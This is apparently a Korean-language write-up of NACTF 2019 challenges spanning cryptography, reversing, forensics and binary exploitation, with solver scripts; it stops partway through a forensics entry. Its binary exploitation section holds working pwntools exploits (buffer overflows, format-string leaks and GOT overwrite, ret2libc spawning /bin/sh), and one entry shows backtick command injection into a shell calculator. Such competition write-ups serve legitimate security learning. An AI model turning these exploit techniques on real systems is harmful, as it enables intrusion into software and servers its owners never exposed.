# NACTF (Newark Academy's Computer Science Club)
with team `༼ つ ◕_◕ ༽つ 뀨` (43/1335)  

## Cryptography
[Vyom's Soggy Croutons](#Vyom-s-Soggy-Croutons)  
[Loony Tunes](#Loony-Tunes)  
[Super Duper AES](#Super-Duper-AES)  
[Dr.J's Group Test Randomizer:Board Problem #0](#Dr-J-s-Group-Test-Randomizer-Board-Problem-0)  
[Dr.J's Group Test Randomizer:Board Problem #1](#Dr-J-s-Group-Test-Randomizer-Board-Problem-1)  
[Dr.J's Group Test Randomizer:BBOB #2](#Dr-J-s-Group-Test-Randomizer-BBOB-2)  
[Reversible Sneaky Algorithm #0](#Reversible-Sneaky-Algorithm-0)  
[Reversible Sneaky Algorithm #1](#Reversible-Sneaky-Algorithm-1)  
[Reversible Sneaky Algorithm #2](#Reversible-Sneaky-Algorithm-2)  
  
## Reverse Engineering
[Keygen](#Keygen)  

## General Skills
[Intro to Flags](#Intro-to-Flags)  
[Join the Discord](#Join-the-Discord)  
[What the HEX?](#What-the-HEX)  
[Off-base](#Off-base)  
[Cat over the wire](#Cat-over-the-wire)  
[Grace's HashBrowns](#Grace-s-HashBrowns)  
[SHCALC](#SHCALC)  
[Hwang's Hidden Handiwork](#Hwang-s-Hidden-Handiwork)  
[Get a GREP #0!](#Get-a-GREP-0)  
[Get a GREP #1!](#Get-a-GREP-1)  
[Cellular Evolution #0:Bellsprout](#Cellular-Evolution-0-Bellsprout)   
[Cellular Evolution #1:Weepinbell](#Cellular-Evolution-1-Weepinbell)  
[Cellular Evolution #2:VikTreebel](#Cellular-Evolution-2-VikTreebel)  
[Cellular Evolution #3:BBOB](#Cellular-Evolution-3-BBOB)  


## Binary Exploitation
[BufferOverflow #0](#BufferOverflow-0)  
[BufferOverflow #1](#BufferOverflow-1)  
[BufferOverflow #2](#BufferOverflow-2)   
[Format #0](#Format-0)  
[Format #1](#Format-1)  
[Loopy #0](#Loopy-0)  
[Loopy #1](#Loopy-1)  

## Forensics
[Least Significant Avenger](#Least-Significant-Avenger)  
[The MetaMeme](#The-MetaMeme)  
[My Ears Hurt](#My-Ears-Hurt)  
[Unzip Me](#Unzip-Me)  
[Kellen's Broken File](#Kellen-s-Broken-File)  
[Kellen's PDF sandwich](#Kellen-s-PDF-sandwich)  
[Filesystem Image](#Filesystem-Image)  
[Phuzzy Photo](#Phuzzy-Photo)  
[File recovery](#File-recovery)  

## Web Exploitation
[Pink Panther](#pink-panther)  
[Scooby Doo](#Scooby-Doo)  
[Dexter's Lab](#dexter-s-lab)  
[Sesame Street](#sesame-street)  

# Vyom's Soggy Croutons
```
Vyom was eating a CAESAR salad with a bunch of wet croutons when he sent me this:

ertkw{vk_kl_silkv}

Can you help me decipher his message?
```
## solve
카이사르 암호다. `key 17`로 복호화가 된다.
## flag
`nactf{et_tu_brute}`

# Loony Tunes
```
Ruthie is very inhumane. She keeps her precious pigs locked up in a pen. I heard that this secret message is the password to unlocking the gate to her PIGPEN. Unfortunately, Ruthie does not want people unlocking the gate so she encoded the password. Please help decrypt this code so that we can free the pigs!

P.S. "_" , "{" , and "}" are not part of the cipher and should not be changed

P.P.S the flag is all lowercase
```
## solve
이미지 한개가 주어지는데 첨보는 암호였다. 문제에서 눈에 띄었던 `PIGPEN`에 대해서 검색해보니 [온라인 en/decrypt 사이트](https://www.boxentriq.com/code-breaking/pigpen-cipher)가 나왔다. 복호화 하면 플래그가 나온다.
## flag
`nactf{th_th_th_thats_all_folks}`

# Super Duper AES
```
The Advanced Encryption Standard (AES) has got to go. Spencer just invented the Super Duper Advanced Encryption Standard (SDAES), and it's 100% unbreakable. AES only performs up to 14 rounds of substitution and permutation, while SDAES performs 10,000. That's so secure, SDAES doesn't even use a key!


```
## exploit
코드 분석이 조금 오래걸렸는데 원본코드에서 print문 이곳저곳에 넣어서 실행해보면서 `substitute()` 함수와 `permute()` 함수의 역함수를 만들면 된다.
```python
import sys
from binascii import hexlify
    
def de_substitute(substitutedHexBlock):
    substitution =  [8, 4, 15, 9, 3, 14, 6, 2, 
                    13, 1, 7, 5, 12, 10, 11, 0]
    r = ""
    for i in range(0, len(substitutedHexBlock)):
        d = int(substitutedHexBlock[i], 16)
        r += str(hex(substitution.index(d))[2:])
    
    return r

def pad(message):
    numBytes = 4-(len(message)%4)
    return message + numBytes * chr(numBytes)

def hexpad(hexBlock):
    numZeros = 8 - len(hexBlock)
    return numZeros*"0" + hexBlock

def de_permute(message):
    permutation =   [6, 22, 30, 18, 29, 4, 23, 19, 
                    15, 1, 31, 11, 28, 14, 25, 2, 
                    27, 12, 21, 26, 10, 16, 0, 24,
                     7, 5, 3, 20, 13, 9, 17, 8]
    msg = int(message, 16)
    hexBlock = 0
    for i in range(32):
        bit = (msg & (1 << i)) >> i
        if bit == 1:
            j = permutation.index(i)
            hexBlock |= 1 << j
    r = hexpad(hex(hexBlock)[2:])
    return r

def decrypt(enc):
    numBlocks = len(enc) // 8
    de_pmsg = ""
    for i in range(numBlocks):
        de_pmsg += de_permute(enc[8*i:8*i+8])

    de_smsg = ""
    for i in range(numBlocks):
        de_smsg += de_substitute(de_pmsg[8*i:8*i+8])

    return de_smsg


j = 10000
plaintext = "d59fd3f37182486a44231de4713131d20324fbfe80e91ae48658ba707cb84841972305fc3e0111c753733cf2"
for i in range(j):
    plaintext = decrypt(plaintext)
plaintext = "".join([chr(int(plaintext[i:i+2],16)) for i in range(0,len(plaintext),2)])
print ("[!]", plaintext)
```
## flag
`nactf{5ub5t1tut10n_p3rmutat10n_n33d5_a_k3y}`

# Dr.J's Group Test Randomizer:Board Problem #0
```
Dr. J created a fast pseudorandom number generator (prng) to randomly assign pairs for the upcoming group test. Leaf really wants to know the pairs ahead of time... can you help him and predict the next output of Dr. J's prng? Leaf is pretty sure that Dr. J is using the middle-square method.

nc shell.2019.nactf.com 31425

The server is running the code in class-randomizer-0.c. Look at the function nextRand() to see how numbers are being generated!
```
## analysis
랜덤값을 연속 두 번 맞추면 되는 문제다. 랜덤값을 가져오는 `nextRand()`함수를 잘 살펴보면 랜덤 결과를 랜덤 시드로 사용하는것을 알 수 있다.
```c 
uint64_t nextRand() {
  // Keep the 8 middle digits from 5 to 12 (inclusive) and square.
  seed = getDigits(seed, 5, 12);
  seed *= seed;
  return seed;
}
```
이러한 알고리즘의 취약성은 랜덤값이 한번이라도 중복된다면 그 이후 랜덤 결과들도 모두 같아진다. 그러므로 중복값이 나올 때까지 랜덤값을 받고, 이후 랜덤값을 알 수 있으니 2번 연속을 맞추면 된다.
## exploit
``` python
from pwn import *

#context.log_level = 'debug'

r = remote("shell.2019.nactf.com", 31425)
c = []
def solve(lst):
	r.recvuntil("> ")
	r.sendline("g")
	for i in lst:
		print(r.recvuntil("> "))
		r.sendline(str(i))
	print(r.recvuntil("flag: "))
	flag = r.recvline()
	log.success(flag)

l = log.progress("Find Loop")
while True:
	r.recvuntil("> ")
	r.sendline("r")
	num = int(r.recvline())
	l.status(str(num))
	if num in c:
		if c[-1] == num:
			loop = [num, num]
		else:
			idx = c[:-1].index(num)
			loop = c[idx+1:idx+3]
		log.info("Find it!! : "+str(loop))
		solve(loop)
		break
	else:
		c.append(num)
```
## flag
`nactf{1_l0v3_chunky_7urn1p5}`

# Dr.J's Group Test Randomizer:Board Problem #1
```
Dr. J is back with another group test, and he patched his prng so we can't predict the next number based on the previous one! Can still you help Leaf predict the next output of the prng?

nc shell.2019.nactf.com 31258

So we can't use the output to predict the next number... but I wonder if the numbers will repeat?
```
## exploit
``` python
from pwn import *

#context.log_level = 'debug'

r = remote("shell.2019.nactf.com", 31258)
c = []
stack = []
def solve(lst):
	r.recvuntil("> ")
	r.sendline("g")
	for i in lst:
		r.recvuntil("> ")
		r.sendline(str(i))
	r.recvuntil("flag:\n")
	flag = r.recvline()
	log.success(flag)

def getNumber():
	r.recvuntil("> ")
	r.sendline("r")
	r_num = int(r.recvline())
	return r_num

def checkLoop(cnt):
	loop = "".join([str(i)+", " for i in c[-cnt:]])[:-2]
	if loop in str(c[:-cnt]):
		return True
	return False

def getLoop(cnt):
	loop = "".join([str(i)+", " for i in c[-cnt:]])[:-2]
	idx = str(c[:-cnt]).index(loop)
	loop = str(c)[idx:-1].split(", ")
	return loop[cnt:cnt+4]

l = log.progress("Find Loop")
while True:
	match_len = 10
	num = getNumber()
	l.status(str(num))
	c.append(num)
	if checkLoop(match_len):
		lp = getLoop(match_len)
		log.info(lp)
		solve(lp)
		break
```
## flag
`nactf{th3_b35t_pr3d1ct0r_0f_fu7ur3_b3h4v10r_15_p4st_b3h4v10r}`

# Dr.J's Group Test Randomizer:BBOB #2
```
This is it. The last group test of the year. Dr. J patched his prng again so numbers won't repeat, so I guess Leaf won't get to know the group test pairs ahead of time... oh WEYL. Who knew middle square could make such a good prng?

nc shell.2019.nactf.com 31382

Widynski wrote, "This RNG is nonlinear and hence the only attack would probably be brute force." Keyword: "probably"
```
# Reversible Sneaky Algorithm #0
```
Yavan sent me these really large numbers... what can they mean? He sent me the cipher "c", the private key "d", and the public modulus "n". I also know he converted his message to a number with ascii. For example:

"nactf" --> \x6e61637466 --> 474080310374

Can you help me decrypt his cipher?
```
## analysis
n과 d값을 알 때 복호화 하는 과정을 묻는 문제였고, 결국 `m = pow(c, d, n)`의 값을 구하는 문제였다.
## exploit
```python
from Crypto.Util import number
n = 14097136998272...388956217393838955462967989235557729
d = 32103967178726...791638682520989591783787929482763483
c = 75974475811116...540681944709850299154477898517149127

# https://en.wikipedia.org/wiki/RSA_(cryptosystem)
m = pow(c, d, n)

flag = number.long_to_bytes(m)
print(flag)
```
## flag
`nactf{w3lc0me_t0_numb3r_th30ry}`

# Reversible Sneaky Algorithm #1
```
Lori decided to implement RSA without any security measures like random padding. Must be deterministic then, huh? Silly goose!

She encrypted a message of the form nactf{****} where the redacted flag is a string of 4 lowercase alphabetical characters. Can you decrypt it?

As in the previous problem, the message is converted to a number by converting ascii to hex.

The flag seems pretty short... can you brute-force it?

(Note: By brute-force, we do not mean brute-forcing the flag submission - do not SUBMIT dozens of flags. Brute force on your own computer.)
```
## analysis
flag가 4글자이므로 평문 기반으로 테이블을 만들어 복호화 할 수 있는지 묻는 문제였다.
## exploit
```python
from Crypto.Util import number

n = 22211149480575639...5032550658101647
e = 65537
c = 17092019895398435...5299057956641732

lst = "abcdefghijklmnopqrstuvwxyz"
for i in lst:
	for j in lst:
		for k in lst:
			for l in lst:
				flag = "nactf{"+i+j+k+l+"}"
				msg = number.bytes_to_long(flag)
				cipher = pow(msg, e, n)
				if cipher == c :
					print(flag)
					exit()
```
## flag
`nactf{pkcs}`

# Reversible Sneaky Algorithm #2
```
Oligar was thinking about number theory at AwesomeMath when he decided to encrypt a message with RSA. As a mathematician, he made various observations about the numbers. He told Molly one such observation:

a^r ≡ 1 (mod n)

He isn't SHOR if he accidentally revealed anything by telling Molly this fact... can you decrypt his message?

Source code, a and r, public key, and ciphertext are attached.

I'm pretty SHOR Oligar was building a quantum computer for something...
```
# Keygen
```
Can you figure out what the key to this program is?
```
## exploit
``` python
res = 21380291284888
flag = ""

def check(i, mini, maxi):
	for j in range(2):
		#print(i*j, mini, maxi)
		if i+62*j > mini and i+62*j <= maxi:
			return i+62*j
	return 0

for k in range(8):
	# a
	a = res - 4
	val_a = check(a % 62, 47, 57)
	# b
	b = res + 71
	val_b = check(b % 62, 96, 122)
	# c
	c = res + 65
	val_c = check(c % 62, 64, 90)

	if val_a != 0:
		res = a - val_a
		flag += chr(val_a)
	elif val_b != 0:
		res = b - val_b
		flag += chr(val_b)
	elif val_c != 0:
		res = c - val_c
		flag += chr(val_c)

	res //= 62

flag  = "nactf{" + flag[::-1] + "}"
print(flag)
```
## flag
`nactf{GEZhxWsw}`

# Intro to Flags
```
Your flag is nactf{w3lc0m3_t0_th3_m4tr1x}.
```
## flag
`nactf{w3lc0m3_t0_th3_m4tr1x}`

# Join the Discord
```
Go to the NACTF home page and find the link to the Discord server. A flag will be waiting for you once you join. So will Austin.
```
## solve
디스코드 들어가면 플래그가 있다.
## flag
`nactf{g00d_luck_h4v3_fun}`

# What the HEX?
```
What the HEX man! My friend Elon just posted this message and I have no idea what it means >:( Please help me decode it:

https://twitter.com/kevinmitnick/status/1028080089592815618?lang=en

Leave the text format: no need to add nactf{} or change punctuation/capitalization
```
## solve
위 링크로 들어가면 케빈미트닉이랑 일론머스크랑 대화한 내용이 나온다. 둘다 변태인지 헥스 데이터로 대화한다. ascii로 바꾸면 플래그가 나온다.
## flag
`I was. Sorry to have missed you.`

# Off-base
```
It seems my friend Rohan won't stop sending cryptic messages and he keeps mumbling something about base 64. Quick! We need to figure out what he is trying to say before he loses his mind...

bmFjdGZ7YV9jaDRuZzNfMGZfYmE1ZX0=
```
## solve
base64 디코딩하면 플래그가 나온다.
## flag
`nactf{a_ch4ng3_0f_ba5e}`

# Cat over the wire
```
Open up a terminal and connect to the server at shell.2019.nactf.com on port 31242 and get the flag!

Use this netcat command in terminal:

nc shell.2019.nactf.com 31242
```
## solve
nc 접속하면 플래그를 준다.
## flag
`nactf{th3_c4ts_0ut_0f_th3_b4g}`

# Grace's HashBrowns
```
Grace was trying to make some food for her family but she really messed it up. She was trying to make some hashbrowns but instead, she made this:

f5525fc4fc5fdd42a7cf4f65dc27571c

I guess Grace is a really bad cook. But at least she tried to add some md5 sauce.

remember to put the flag in nactf{....}
```
## solve
md5 복호화 하면 나온다.
## flag
`nactf{grak}`

# SHCALC
```
John's written a handy calculator app - in bash! Too bad it's not that secure...

Connect at nc shell.2019.nactf.com 31214
```
## solve
shcalc라는 이름 답게 쉘에서 실행되는 계산기인듯 하다. 이것저것 넣어보다가 백쿼터에서 에러가 발생했고, 이를 이용해서 `command injeciton`을 했다.
```bash
> `ls -al`
sh: 1: arithmetic expression: expecting EOF: "total 16
drwxr-xr-x 1 root root 4096 Sep 13 05:38 .
drwxr-xr-x 1 root root 4096 Sep 21 23:35 ..
-rwxrwxrwx 1 root root  125 Sep 13 05:38 calc.sh
-rw-r--r-- 1 root root   29 Sep 13 05:38 flag.txt"
> `cat calc.sh`
sh: 1: arithmetic expression: expecting primary: "#!/bin/sh

cat <<EOF
shcalc v1.1
EOF

echo -n '> '
while read input; do
        env -i sh -c "echo \$(($input))"
        echo -n '> '
done"
>
sh: 1: arithmetic expression: expecting primary: ""
> `cat flag.txt`
sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
>
```
## flag
`nactf{3v4l_1s_3v1l_dCf80yOo}`

# Hwang's Hidden Handiwork
```
Hwang was trying to hide secret photos from his parents. His mom found a text file with a secret string and an excel chart which she thinks could help you decrypt it. Can you help uncover Hwang's Handiwork?

Of course, the nobler of you may choose not to do this problem because you respect Hwang's privacy. That's ok, but you won't get the points.
```
## decrypt
txt 파일에 이상한 암호문이 적혀있었고, 추가로 encrypt 테이블로 보이는 csv 파일이 주어졌다. 아래 코드를 통해 복호화할 수 있었고, 그 결과로 URL을 얻어냈다.
```python
import csv


cipher = "SccLJ0ddkSGy=PP=kM8JMDmPCcMCcymPedh9_r_GwDtt.::/.1TS_Ba:uU9KNpzir:VcNEVK/PPDXCImKlqK8rqtfOAvisA2MIikfjEq1ReFNC/gi_bf5fbrOSxrODf"

f = open("substitution.csv")
f = csv.reader(f)
csv_data = [i[1:] for i in f]

plaintext = csv_data[0]
ciphertext = csv_data[1]

plain = ""
for i in cipher:
	plain += plaintext[ciphertext.index(i)]

print(plain)

# https://lh3.googleusercontent.com/vdx0x3krzzyWWSy4ahxBiWJGdIQR9j0W_tQL_ISoorqnAcIKCIu0Czw-ZbjTZ8eAjlwfLC4Dm6QnSPjx5w=w50-h10-rw
```
그러나 이 이미지는 깨진건지 잘 보이지 않았다.

## solve
이 URL에 한가지 이상한 점은 리소스 맨 마지막에 인자처럼 보이는 부분이 있다는 것이다. w는 width h는 height로 보인다. 실제로 저 값을 다르게 주면 이미지가 잘 복원이 된다. 나는 250과 50으로 주었다.

## flag
`nactf{g00gl3_15nt_s3cur3_3n0ugh}`

# Get a GREP #0!
```
Vikram was climbing a chunky tree when he decided to hide a flag on one of the leaves. There are 10,000 leaves so there's no way you can find the right one in time... Can you open up a terminal window and get a grep on the flag?
```
## solve
zip 파일이 주어졌고, 압축이 안걸려있었다. 그래서 바로 `strings`로 뽑아서 `grep`으로 잡았다.
``` bash
➜ strings bigtree.zip | grep na
bigtree/branch8/branch3/branch5/leaf8351.txtnactf{v1kram_and_h1s_10000_l3av3s}
```
## flag
`nactf{v1kram_and_h1s_10000_l3av3s}`

# Get a GREP #1!
```
Juliet hid a flag among 100,000 dummy ones so I don't know which one is real! But maybe the format of her flag is predictable? I know sometimes people add random characters to the end of flags... I think she put 7 random vowels at the end of hers. Can you get a GREP on this flag?
```
## solve
문제에서 제공한 조건에 맞추어 grep 정규식을 이용했다.
``` bash
➜ grep -e "[aeiou]\{7\}}" flag.txt 
nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}
```
## flag
`nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}`

# Cellular Evolution #0:Bellsprout
```
Vikram Loves Bio!

He loves it so much that he started growing Cellular Automata in a little jar of his. He hopes his Cellular Automata can be as strong as HeLa Cells. He has so many cells growing that he decided to hire you to help him with his project. Can you open these files and follow Vikram's instructions?

Use the flag format nactf{...}
```
## solve
그냥저냥 프로그래밍 문제,,

# Cellular Evolution #1:Weepinbell
```
Apparently, Vikram was not satisfied with your work because he hired a new assistant: Eric. Eric has been doing a great job with managing the cells but he has allergies. Eric sneezed and accidentally messed up the order of the cells. Can you help Eric piece the cells back together?

btw, flag is all lowercase
```
## solve
그냥저냥 프로그래밍 문제,,

# Cellular Evolution #2:VikTreebel
```
Thanks to your help, Eric and Vikram fixed their cells. Business is booming, and they're now a multinational megacorporation! They need bigger cells to meet demand: Eric used the rule "sum8" to evolve his cells to their next stage of evolution! Sum8 sets each cell to the sum of the cells around it (see examples). Eric sent us his evolved cells, but we want to know what they looked like before! Can you turn back time and get the flag?
```
## solve
그냥저냥 눈썰미 문제,,

# Cellular Evolution #3:BBOB
```
Dr. J was teaching Linear Algebra when he decided to buy some of Eric and Vik's cells! He cultivated the cells, drew a secret flag, and performed one step of "sum8". Luckily, he learned from Eric's mistake and added random 0's, 1's, and 2's in the background so nobody can reverse the message. Can you still get the flag?

The20thDuc

=====
Submit your answer with the flag format nactf{}. Use all lowercase alphabetical characters and include underscores between words.
=====
It would take a really really really long time to solve this by hand... can you write a program to reverse it?
=====
Remember that the simulator wraps around in both the horizontal and vertical directions.
=====
This takes about 5 minutes to run on a laptop.
=====
The numbers in inpattern.txt are hexadecimal.
```
## solve
그냥저냥 어려운 프로그래밍 문제,,

# BufferOverflow #0
```
The close cousin of a website for "Question marked as duplicate"

Can you cause a segfault and get the flag?

shell.2019.nactf.com:31475
```
## exploit
c 코드를 보면 win에서 쉘을 띄워준다. 버퍼에 입력받는 과정에서 BOF가 발생하므로 gdb를 열어서 buf의 실제 할당 크기와 win의 주소를 구했다. 이후 overflow를 일으켜서 return 주소를 덮어씌우면 쉘이 따진다.
``` python
from pwn import *

#x = process("./bufover-0")
x = remote("shell.2019.nactf.com", 31475)
win = 0x80491c2

x.recvuntil("Type something>")

payload = "a"*(0x18+4)
payload += p32(win)

x.sendline(payload)
x.interactive()
```
## flag
`nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`

# BufferOverflow #1
```
The close cousin of a website for "Question marked as duplicate" - part 2!

Can you redirect code execution and get the flag?

Connect at shell.2019.nactf.com:31462
```
## solve
1번과 같은 원리로 코드를 짰다.
## flag
`nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`

# BufferOverflow #2
```
The close cousin of a website for "Question marked as duplicate" - part 3!

Can you control the arguments to win() and get the flag?

Connect at shell.2019.nactf.com:31184
```
## exploit
코드를 보면 인자를 검사하는 부분이 있다. 스택 프레임을 고려해서 인자를 넘기면 된다. 첫번째 인자가 long형인지 모르고 삽질했는데 주의하자.
``` python
from pwn import *

context.log_level = "debug"

#x = process("./bufover-2")
x = remote("shell.2019.nactf.com", 31184)
win = 0x80491c2

x.recvuntil("Type something>")

payload = "a"*(0x18+4)
payload += p32(win)
payload += "aaaa" # return addr after win()
payload += p64(0x14b4da55) # long argv1
payload += p32(0xf00db4be) # int argv2

x.sendline(payload)
x.interactive()
```
## flag
`nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}`

# Format #0
```
Someone didn't tell Chaddha not to give user input as the first argument to printf() - use it to leak the flag!

Connect at shell.2019.nactf.com:31782
```
## exploit
코드를 보면 이번에는 오버플로우가 일어나지 않는다. 대신 `print()` 부분에서 `FSB(Format String Bug)`가 발생한다. 이를 이용해서 `vuln`의 `stack frame`을 벗어나 `main`의 `buf` 변수를 읽으면 된다.
``` python
from pwn import *

def reverse(hexa):
	for i in range(9-len(hexa)):
		hexa = "0"+hexa
	string = ""
	for i in range(0, len(hexa)-1, 2):
		print(hexa[i:i+2])
		string += chr(int(hexa[i:i+2], 16))
	return string[::-1]

start = 31
flag = ""
for i in range(start, 50):
	#x = process("./format-0")
	x = remote("shell.2019.nactf.com", 31782)
	p = "%"+str(i)+"$p"
	x.sendline(p)
	x.recvuntil("You typed: ")
	res = x.recvline()[2:]
	flag += reverse(res)
	print(flag)
	
print flag
```
## flag
`nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}`

# Format #1
```
printf can do more than just read memory... can you change the variable?

Connect at nc shell.2019.nactf.com 31560
```
## exploit
이 코드에서는 win() 함수가 쉘을 실행시켜주기 때문에 win으로 넘어가기 위한 조건문을 성립시키기 위해 `FSB`로 num의 주소에 접근해서 값을 변경해주면 된다.
``` python
from pwn import *

x = remote("shell.2019.nactf.com", 31560)
#x = process("./format-1")

payload = "%42c%24$n"

x.recvuntil("Type something>")
x.sendline(payload)
x.interactive()
```
## flag
`nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}`

# Loopy #0
```
This program is quite short, but has got printf and gets in it! This shouldn't be too hard, right?

Connect at nc shell.2019.nactf.com 31283
```
## exploit
코드를 보면 flag.txt를 보여주지도 않고, 쉘을 띄워주는 코드도 없다. 직접 `system("/bin/sh")`를 실행해야 한다. system함수의 주소를 구하기 위해서 libc base가 필요한데 main이 종료되고 리턴하는 `__libc_start_main`의 주소를 `FSB`를 통해 스택에서 leak 하면 된다. 그리고 프로그램을 종료시키지 않고 한번에 바로 공격하기 위해 리턴주소를 overflow 해서 main으로 다시 향하게 한다. 구해진 `__libc_start_main`의 주소에서 해당 asm의 오프셋(241)을 빼면 실제 함수 주소가 나오고, 서버에서 로드되는 `libc.so.6`에서 같은 함수의 오프셋을 뽑아서 실제 함수 주소에서 차감하면 libc의 주소를 구할 수 있다. 구해진 libc에서 `libc.so.6`에서 뽑아온 system 함수의 오프셋을 더해서 실제 system 함수 주소를 구할 수 있다. 필요한 주소를 모두 구했으니 해당 함수를 실행하도록 overwrite를 한번 더 시도하면 된다.
```python
from pwn import *

#context.log_level = "debug"


#x = process("./loopy-0")
x = remote("shell.2019.nactf.com", 31283)
c_main = 0x080491e7

e = ELF("./loopy-0")
#lib = e.libc
lib = ELF("../libc.so.6")

def doit(payload):
	x.recvuntil("Type something>")
	x.sendline(payload)

# === fsb for libc ===
p = "a"*71 # buf(64) + dummy(8) - 1
p += "%27$p" # __libc_start_main+241 in sfp(4)
p += p32(c_main) # return to main
doit(p)
x.recvuntil("0x")
libc = int(x.recv(8),16) - 241 - lib.symbols['__libc_start_main']
log.info("libc :" +hex(libc))

# === system("/bin/sh") ===
p = "a"*76
p += p32(libc + lib.symbols['system']) # system()
p += "rrrr" # ret
p += p32(libc + next(lib.search("/bin/sh"))) # /bin/sh
doit(p)

x.interactive()
```
## flag
`nactf{jus7_c411_17_4g41n_AnZPLmjm}`

# Loopy #1
```
Same program as Loopy #0, but someone's turned on the stack protector now!

Connect at nc shell.2019.nactf.com 31732
```
## analysis
무척 삽질했던 문제다. NX에 카나리가 걸려있어서 카나리를 알아내보려 했지만 카나리를 알아내도 프로그램이 종료되면서 무의미해져버렸다. `FSB`를 이용해서 `__stack_chk_fail()` 함수에 `got overwrite`를 해서 카나리가 틀렸을 때, 원하는 곳으로 분기하도록 했다. 내 경우에는 `main`으로 분기해서 카나리를 유지한채 다시 입력을 받을 수 있게 했다.
``` python
from pwn import *

#context.log_level = "debug"

e = ELF("./loopy-1")
lib = ELF("../libc.so.6")
#lib = e.libc

x = remote("shell.2019.nactf.com", 31732)
#x = process("./loopy-1")
pause()
main = hex(e.symbols['main'])[2:]
main1 = int("0" + main[:3], 16)
main2 = int(main[3:], 16)

log.info(main)

# === plt overwrite __stack_chk_fail to main  ===
payload = "%{}c%15$hn%{}c%14$hn000".format(main1, main2 - main1)
payload += p32(e.got['__stack_chk_fail'])
payload += p32(e.got['__stack_chk_fail']+2)
payload += "a"*(0x4c-len(payload)+4)
x.sendlineafter("Type something>",payload)

# === Memory leak for libcbase, canary ===
payload = "%71$x %31$x "
payload += "a"*(0x4c-len(payload)+4)
x.sendlineafter("Type something>",payload)
x.recvuntil("typed: ")
res = x.recv(20).split(" ")[:-1]
canary = int(res[1], 16)
libcbase = int(res[0], 16) - 241 - lib.symbols['__libc_start_main'] 

log.info("canary : " +hex(canary))
log.info("libcbase : "+hex(libcbase))

# === system("/bin/sh") ===
print("!!! attack!!!")
payload = "a"*(64)
payload += p32(canary)
payload += "a"*12
payload += p32(libcbase + lib.symbols['system']) # system()
payload += "Aaaa"
payload += p32(libcbase + next(lib.search("/bin/sh"))) #binsh
x.sendlineafter("Type something>",payload)

x.interactive()
```
두번째 입력에서는 `__libc_start_main`의 주소를 leak해서 `libcbase`를 구했고, 동시에 카나리 값도 구했다. main이 중첩되다 보니까 스택 프레임이 약간 꼬여보여서 위치를 찾기 어려웠다. 이후 세번째 입력에서 쉘을 띄울 수 있었다.
## flag
`nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ}`












# Least Significant Avenger
```
I hate to say it but I think that Hawkeye is probably the Least Significant avenger. Can you find the flag hidden in this picture?

Hiding messages in pictures is called stenography. I wonder what the least significant type of stenography is.
```
## solve
``` bash
➜ strings insignificant_hawkeye.png | grep "nactf"
➜ binwalk insignificant_hawkeye.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 332 x 152, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed

➜ zsteg insignificant_hawkeye.png
/usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /mnt/c in PATH, mode 040777
imagedata           .. file: MIPSEL-BE MIPS-III ECOFF executable not stripped - version 0.1
b1,rgb,lsb,xy       .. text: "nactf{h4wk3y3_15_th3_l34st_51gn1f1c4nt_b1t}"
b3,g,lsb,xy         .. text: "L4Xe\"Bm\""
b4,r,msb,xy         .. text: "0s%S@%3dBbQSa"
b4,g,lsb,xy         .. text: "8vURSDS\"#"
b4,g,msb,xy         .. text: "NPcDa0P '"
b4,b,msb,xy         .. text: "veq1q#AR"
b4,rgb,msb,xy       .. text: "\"qVBvtAqF"
b4,bgr,msb,xy       .. text: "sFUcS1sDQ2Q!qgs&c1E"
b4,rgba,lsb,xy      .. text: ";oHO8_vOg_"
b4,abgr,msb,xy      .. text: "/^O4Op?5"
```
## flag
`nactf{h4wk3y3_15_th3_l34st_51gn1f1c4nt_b1t}`


# The MetaMeme
```
Phil sent me this meme and its a little but suspicious. The meme is super meta and it may be even more meta than you think.

Wouldn't it be really cool if it also had a flag hidden somewhere in it? Well you are in luck because it certainly does!
```
## solve
``` bash
➜ strings metametametameta.pdf | grep "nactf"
/Subject (nactf{d4mn_th15_1s_s0_m3t4})
```
## flag
`nactf{d4mn_th15_1s_s0_m3t4}`


# My Ears Hurt
```
The20thDuck sent me this really annoying audio file. It's way too high pitched to be his voice. What he is trying to tell me? Maybe its a code; he is the crypto master after all.

You may have to convert file types.

You will need to insert the string into the nactf{...} form before submitting.
```
## solve
음원파일이 주어진다. 바로 `audacity`를 열어보면 모스무호의 직감이 온다. 그대로 옮겨보면 `-.. .---- -.. ..- -.. ----- - .... .---- ..... -... -.-- .... ....- -. -..`
## flag
`nactf{D1DUD0TH15BYH4ND}`


# Unzip Me
```
I stole these files off of The20thDucks' computer, but it seems he was smart enough to put a password on them. Can you unzip them for me?

All the passwords are real words and all lowercase
```
## solve
모든 패스워드는 lowercase로 이루어진 실제 단어라고 한다. 브루트포스하라는 얘기. `fcrackzip`으로 딕셔너리 기반 브루트포스를 진행했다.
``` bash
 ~/ctf/nactf/unzip  fcrackzip -u -D -p google-10000-english/20k.txt zip1.zip

PASSWORD FOUND!!!!: pw == dictionary
 ~/ctf/nactf/unzip  fcrackzip -u -D -p google-10000-english/20k.txt zip2.zip
PASSWORD FOUND!!!!: pw == rock
 ~/ctf/nactf/unzip  fcrackzip -u -D -p google-10000-english/20k.txt zip3.zip


PASSWORD FOUND!!!!: pw == dog
```
위 패스워드로 압축을 풀어서 나온 문서의 내용을 이어보면 플래그가 나온다.
## flag
`nactf{w0w_y0u_unz1pp3d_m3}`

# Kellen's Broken File
```
Kellen gave in to the temptation and started playing World of Tanks again. He turned the graphics up so high that something broke on his computer!

Kellen is going to lose his HEAD if he can't open this file. Please help him fix this broken file.
```
## solve
``` bash
➜ file Kellens_broken_file.pdf
Kellens_broken_file.pdf: data
➜ binwalk Kellens_broken_file.pdf

DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------

➜ xxd Kellens_broken_file.pdf | head -3
0000: 312e 330a 25c4 e5f2 e5eb a7f3 a0d0 c4c6  1.3.%...........
